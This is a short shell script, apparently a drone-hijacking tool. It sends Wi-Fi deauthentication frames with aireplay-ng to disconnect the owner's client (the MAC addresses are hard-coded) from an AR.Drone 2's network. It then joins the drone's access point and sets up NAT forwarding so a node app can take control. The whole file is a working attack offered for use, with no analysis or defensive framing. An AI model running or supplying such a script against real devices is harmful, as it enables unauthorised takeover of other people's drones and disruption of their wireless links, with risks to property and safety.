#! /bin/sh
#
# Create monitoring interface
#iw wlan1 del
#iw phy1 interface add mon0 type monitor
#ip link set mon0 up
#
# Disconnect real client in background
ip link set mon0 up
iw mon0 set channel 6
echo Sending deauth
aireplay-ng -0 3 -a 90:03:b7:c8:68:d0 -c 60:45:cb:22:11:9f mon0 >/tmp/aireplay-ng
#
# Connect to drone
#echo Waiting for deauth
#sleep 2
#
iw wlan0 connect ardrone2_025774
echo Connecting
sleep 0.5
while [ "$(iw wlan0 link)" = "Not connected." ]; do
  sleep 0.5
  echo Not connected...
done
#
echo Connected
dhclient -v wlan0
echo "=> adding iptables rules"
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -F
iptables -t nat -A PREROUTING -d 172.20.1.10 -j DNAT --to 192.168.1.1
iptables -t nat -A POSTROUTING -o wlan0 -j SNAT --to 192.168.1.2
echo "You can launch on 172.20.1.1 using:"
echo "  export DEFAULT_DRONE_IP=172.20.1.10"
echo "  node app.js"
#
#echo Waiting deauth to end
#while pgrep -u $UID -x aireplay-ng >/dev/null; do sleep 0.5; done
